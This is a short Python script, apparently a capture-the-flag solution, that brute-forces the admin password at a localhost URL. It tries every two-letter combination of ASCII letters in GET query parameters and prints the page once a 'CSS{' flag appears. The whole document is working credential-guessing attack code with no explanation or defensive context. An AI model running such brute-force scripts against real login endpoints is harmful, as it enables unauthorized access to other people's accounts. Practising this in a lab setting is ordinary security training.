import requests as r
import string

TARGET = "http://localhost:1337/?username=admin&password={}"
charset = string.ascii_letters

for i in charset:
    for j in charset:
        payload = TARGET.format(i+j)
        print(f"Trying {payload}")
        res = r.get(payload)

        if "CSS{" in res.text:
            print(res.text)
            exit()
